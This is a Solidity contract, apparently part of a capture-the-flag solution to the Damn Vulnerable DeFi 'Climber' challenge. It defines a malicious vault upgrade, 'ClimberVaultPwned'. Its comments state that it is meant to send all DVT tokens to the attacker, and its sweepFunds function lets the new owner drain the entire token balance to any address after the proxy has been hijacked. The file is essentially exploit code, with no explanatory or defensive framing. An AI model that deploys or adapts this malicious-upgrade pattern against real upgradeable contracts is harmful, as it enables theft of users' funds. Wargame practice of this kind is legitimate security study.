// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";

/**
 * @title ClimberVaultPwned
 * @dev Malicious vault to send all DVTs to attacker
 * @author your boi
 */
contract ClimberVaultPwned is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    /* unable to call initialize() during upgradeToAndCall(), hence had to
        modify sweepFunds instead */
    // function initialize(address sweeper) external initializer {
    //     // Initialize inheritance chain
    //     __Ownable_init();
    //     __UUPSUpgradeable_init();
    //     console.log("oops");
    //     // Deploy timelock and transfer ownership to it
    //     // transferOwnership(address(new ClimberTimelock(admin, proposer)));

    //     _setSweeper(sweeper);
    //     _setLastWithdrawal(block.timestamp);
    //     _lastWithdrawalTimestamp = block.timestamp;
    // }

    // Modifying this fn to send all tokens directly to attacker
    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address tokenAddress, address to) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(to, token.balanceOf(address(this))), "Transfer failed");
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
